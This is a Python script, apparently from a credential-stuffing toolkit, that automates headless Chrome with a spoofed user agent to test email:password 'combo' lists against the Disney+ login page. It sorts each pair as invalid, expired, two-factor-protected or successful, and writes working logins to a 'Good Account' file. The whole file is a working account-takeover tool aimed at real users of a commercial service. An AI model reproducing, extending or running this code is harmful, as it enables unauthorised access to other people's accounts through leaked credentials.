import time
import os

from headers.disney_header import header
from combo_splitters.split_combos import ComboSplitter
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import ElementClickInterceptedException
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path


def disney():
    header()
    file_directory = str(Path(__file__).parents[1]) + '/disney'
    plain_directory = str(Path(__file__).parents[1])
    page = 'https://www.disneyplus.com/login'
    login_process_complete = False
    iframe = False
    splitter = ComboSplitter(file_directory, "disney")
    try:
        users, passwords = splitter.split_file()
    except TypeError:
        splitter.return_error()
        exit()
    browser_options = Options()
    browser_options.add_argument(
        'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
    browser_options.add_argument("--headless=new")
    os.makedirs(plain_directory + '/accounts', exist_ok=False)
    index = 0
    while index != len(users):
        with open(plain_directory + '/accounts/disney_acc', 'a') as account_results:
            try:
                print('\rTrying Combo {} out of {}'.format(index + 1, len(users)), end='')
                browser = webdriver.Chrome(options=browser_options)
                browser.set_window_size(200,200)
                browser.get(page)
                time.sleep(6)
                if browser.find_elements(By.XPATH, '//*[@id="onetrust-reject-all-handler"]'):
                    gdpr_reject_all = browser.find_element(By.XPATH, '//*[@id="onetrust-reject-all-handler"]')
                    gdpr_reject_all.click()
                email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
                email_input_box.send_keys(users[index])
                if browser.find_elements(By.XPATH, '//*[@id="loginEmail"]/div[2]/button'):
                    email_submit_button = browser.find_element(By.XPATH, '//*[@id="loginEmail"]/div[2]/button')
                    email_submit_button.click()
                    time.sleep(2)
                if browser.find_elements(By.XPATH, '//*[@id="app_index"]/div[2]/div/div'):
                    print(" | {}:{} ---> Invalid Login".format(users[index], passwords[index]))
                    iframe = True
                if browser.find_elements(By.XPATH, '//*[@id="app_index"]/div[3]/div/div'):
                    print(" | {}:{} ---> Invalid Email".format(users[index], passwords[index]))
                    iframe = True
                if browser.find_elements(By.XPATH, '//*[@id="loginEmail"]/div[2]/button') and iframe != True:
                    continue_button = browser.find_element(By.XPATH, '//*[@id="loginEmail"]/div[2]/button')
                    continue_button.click()
                if browser.find_elements(By.XPATH, '//*[@id="password-continue-login"]'):
                    pass_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
                    pass_input_box.send_keys(passwords[index])
                    time.sleep(2)
                    login_button = browser.find_element(By.XPATH, '//*[@id="password-continue-login"]')
                    login_button.click()
                    time.sleep(5)
                    login_process_complete = True
                if browser.find_elements(By.XPATH, '//*[@id="section_index"]/div/div[2]/div/button'):
                    print(" | {}:{} ---> Subscription Expired".format(users[index], passwords[index]))
                if browser.find_elements(By.XPATH, '//*[@id="onboarding_index"]/div/div/form/h3'):
                    two_factor_authentication = browser.find_element(By.XPATH, '//*[@id="onboarding_index"]/div/div/form/h3').text
                    if 'Check your email inbox' in str(two_factor_authentication):
                        print(" | {}:{} ---> Protected by Two-Factor Authentication".format(users[index],
                                                                                            passwords[index]))
                if login_process_complete:
                    time.sleep(5)
                    if browser.find_elements(By.XPATH, '//*[@id="password__error"]'):
                        print(" | {}:{} ---> Invalid Password".format(users[index], passwords[index]))
                    if browser.find_elements(By.XPATH, '//*[@id="remove-main-padding_index"]/div/div/section'):
                        print(" | {}:{} ---> Success!".format(users[index], passwords[index]))
                        account_results.write('{}:{} ---> Good Account\n'.format(users[index], passwords[index]))
                index += 1
                iframe = False
                login_process_complete = False
                browser.close()
            except NoSuchElementException:
                print(" | Timed Out")
            except ElementClickInterceptedException:
                print(" | Element Intercepted...continuing from where I left off")